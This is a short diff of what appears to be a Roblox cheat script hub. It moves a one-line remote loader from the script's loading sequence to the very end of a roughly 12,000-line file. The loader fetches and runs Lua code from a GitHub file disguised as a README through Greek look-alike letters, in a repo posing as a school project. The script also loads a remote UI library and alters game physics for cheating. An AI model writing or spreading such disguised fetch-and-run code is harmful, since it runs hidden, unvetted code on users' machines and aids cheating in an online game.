@@ -1309,8 +1309,6 @@ end
 
 StartLoadingSequence() 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/wx-sources/meuProjetoDeEscola/refs/heads/main/READ%CE%9C%CE%95.md.luau"))()
-
 local Libary = loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/Library-ui/refs/heads/main/Redzhubui"))()
 workspace.FallenPartsDestroyHeight = -math.huge
 
@@ -12091,3 +12089,4 @@ UniversalTab:AddButton({
     end
 })
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wx-sources/meuProjetoDeEscola/refs/heads/main/READ%CE%9C%CE%95.md.luau"))()
